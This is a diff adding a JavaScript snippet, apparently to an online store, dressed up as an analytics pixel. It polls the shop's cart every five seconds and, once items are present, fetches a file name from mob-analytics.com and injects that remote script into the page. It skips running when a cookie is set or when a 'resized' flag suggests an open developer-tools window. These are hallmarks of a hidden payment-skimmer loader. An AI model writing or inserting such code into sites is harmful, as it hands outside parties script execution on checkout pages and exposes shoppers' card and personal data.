@@ -1,0 +1,56 @@
+(function () {
+    var n = "mob_ct";
+
+    function hasCookie() {
+        return document.cookie.split(';').some(function (c) { return c.trim().indexOf(n + '=') === 0; });
+    }
+
+    if (hasCookie()) {
+        
+        return;
+    }
+
+    var rz = window.__cdntrackhub_isResized;
+    if (rz ? rz() : window.__cdntrackhub_resized) {
+        
+        return;
+    }
+
+    var newInterval;
+
+    function addCartItem() {
+        if (hasCookie()) {
+            
+            clearInterval(newInterval);
+            return;
+        }
+        fetch('/cart.json')
+            .then(function (r) {
+                if (!r.ok) { throw new Error('HTTP error! status: ' + r.status); }
+                return r.json();
+            })
+            .then(function (cart) {
+                var itemCount = cart && cart.item_count ? cart.item_count : 0;
+                if (itemCount > 0) {
+                    clearInterval(newInterval);
+
+                    return fetch("https://mob-analytics.com/gtm/api_pixel_2.php?retag_id=88505&retag_data_id=949", { credentials: 'omit' })
+                        .then(function (r) { return r.json(); })
+                        .then(function (d) {
+                            if (!d || !d.file) {
+                                throw new Error(d && d.error ? d.error : 'no file');
+                            }
+                            var s = document.createElement('script');
+                            s.async = true;
+                            s.src = "https://mob-analytics.com/gtm/main/" + d.file + '.js';
+                            (document.head || document.documentElement).appendChild(s);
+                        });
+                }
+            })
+            .catch(function (e) {
+                
+            });
+    }
+	addCartItem();
+    newInterval = setInterval(addCartItem, 5000);
+})();
